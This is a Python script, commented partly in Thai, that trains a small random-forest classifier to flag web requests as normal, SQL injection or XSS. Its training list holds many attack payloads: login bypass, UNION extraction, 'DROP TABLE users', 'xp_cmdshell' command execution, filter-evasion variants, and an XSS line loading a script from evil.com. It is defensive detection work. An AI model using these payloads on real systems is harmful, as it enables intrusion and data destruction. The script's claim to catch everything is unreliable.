import pandas as pd
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
import joblib

# 1. Dataset (รวมมิตร Normal + Advanced SQLi + Advanced XSS)
data = [
    # ==========================================
    # ✅ Normal Traffic
    # ==========================================
    ("GET /login?user=admin", "Normal"),
    ("GET /login?user=somchai", "Normal"),
    ("GET /login?user=somsri", "Normal"),
    ("GET /login?user=manop", "Normal"),
    ("GET /login?user=pranee", "Normal"),
    ("GET /login?user=guest", "Normal"),
    ("GET /login?user=tester", "Normal"),
    ("GET /home", "Normal"),
    ("GET /contact", "Normal"),
    ("GET /products/view?id=105", "Normal"),
    ("GET /news?category=sport", "Normal"),
    ("GET /search?q=notebook", "Normal"),
    ("GET /search?q=hello world", "Normal"),
    ("GET /assets/css/style.css", "Normal"),
    ("GET /js/app.js", "Normal"),
    ("GET /", "Normal"),

    # ==========================================
    # 💉 SQL Injection
    # ==========================================
    
    # --- Auth Bypass ---
    ("GET /login?user=' OR '1'='1", "SQL Injection"),
    ("GET /login?user=admin' OR 1=1 --", "SQL Injection"),
    ("GET /login?user=' OR 1=1 #", "SQL Injection"),
    ("GET /login?user=admin' --", "SQL Injection"),
    ("GET /login?user=' OR TRUE --", "SQL Injection"),
    
    # --- Union Based ---
    ("GET /login?user=UNION SELECT 1,2,3 --", "SQL Injection"),
    ("GET /login?user=UNION ALL SELECT table_name, null FROM information_schema.tables", "SQL Injection"),
    ("GET /login?user=' UNION SELECT user, password FROM users #", "SQL Injection"),
    ("GET /login?user=UNION SELECT null, @@version --", "SQL Injection"),
    
    # --- Error Based / System Info ---
    ("GET /login?user=SELECT version()", "SQL Injection"),
    ("GET /login?user=SELECT user()", "SQL Injection"),
    ("GET /login?user=SELECT database()", "SQL Injection"),
    ("GET /login?user=@@datadir", "SQL Injection"),
    ("GET /login?user=AND (SELECT 1 FROM", "SQL Injection"),
    
    # --- Time Based / Blind ---
    ("GET /login?user=1' AND SLEEP(5) --", "SQL Injection"),
    ("GET /login?user='; WAITFOR DELAY '0:0:5'--", "SQL Injection"),
    ("GET /login?user=pg_sleep(10)", "SQL Injection"),
    
    # --- Stacked & Obfuscation ---
    ("GET /login?user='; DROP TABLE users; --", "SQL Injection"),
    ("GET /login?user='; EXEC xp_cmdshell('dir'); --", "SQL Injection"),
    ("GET /login?user=1/**/OR/**/1=1", "SQL Injection"), # ใช้ comment แทน space
    ("GET /login?user=UnIoN/**/SeLeCt", "SQL Injection"),

    # ==========================================
    # ☠️ XSS Attack
    # ==========================================
    
    # --- Basic Tags ---
    ("GET /login?user=<script>alert(1)</script>", "XSS Attack"),
    ("GET /login?user=<SCRIPT>alert('XSS')</SCRIPT>", "XSS Attack"),
    ("GET /login?user=<script src=http://evil.com/xss.js></script>", "XSS Attack"),
    
    # --- Event Handlers ---
    ("GET /login?user=<img src=x onerror=alert(1)>", "XSS Attack"),
    ("GET /login?user=<body onload=alert(1)>", "XSS Attack"),
    ("GET /login?user=<input onfocus=alert(1) autofocus>", "XSS Attack"),
    ("GET /login?user=<details ontoggle=alert(1)>", "XSS Attack"),
    
    # --- SVG & XML (หลบ WAF) ---
    ("GET /login?user=<svg/onload=alert(1)>", "XSS Attack"),
    ("GET /login?user=<svg><script>alert(1)</script>", "XSS Attack"),
    ("GET /login?user=<math><mtext><option><fake><xmp><script>alert(1)</script>", "XSS Attack"),
    
    # --- Javascript URI ---
    ("GET /login?user=javascript:alert(1)", "XSS Attack"),
    ("GET /login?user=jaVasCript:alert(1)", "XSS Attack"),
    ("GET /login?user=<a href='javascript:alert(1)'>Click</a>", "XSS Attack"),
    
    # --- Iframe & Object ---
    ("GET /login?user=<iframe src=javascript:alert(1)>", "XSS Attack"),
    
    # --- Payloads ดิบๆ (เผื่อ Agent ตัด HTTP ออก) ---
    ("<script>alert(1)</script>", "XSS Attack"),
    ("<img src=x onerror=alert(1)>", "XSS Attack"),
    ("javascript:alert(1)", "XSS Attack"),
    ("SELECT version()", "SQL Injection"),
    ("UNION SELECT", "SQL Injection")
]

# 2. แปลงข้อมูล
print("🧠 Training AI Model (Ultimate Edition)...")
df = pd.DataFrame(data, columns=['request', 'type'])

# ใช้ ngram_range=(1, 4) และ regex ที่จับอักขระพิเศษได้ดีเยี่ยม
vectorizer = TfidfVectorizer(token_pattern=r'(?u)\b\w+\b|[^a-zA-Z0-9\s]', ngram_range=(1, 4)) 
X = vectorizer.fit_transform(df['request'])
y = df['type']

# 3. เทรนโมเดล
model = RandomForestClassifier(n_estimators=200, random_state=42)
model.fit(X, y)

# 4. บันทึก
joblib.dump(model, 'security_model.pkl')
joblib.dump(vectorizer, 'vectorizer.pkl')

print("✅ Model Trained & Saved! (Ready to catch EVERYTHING)")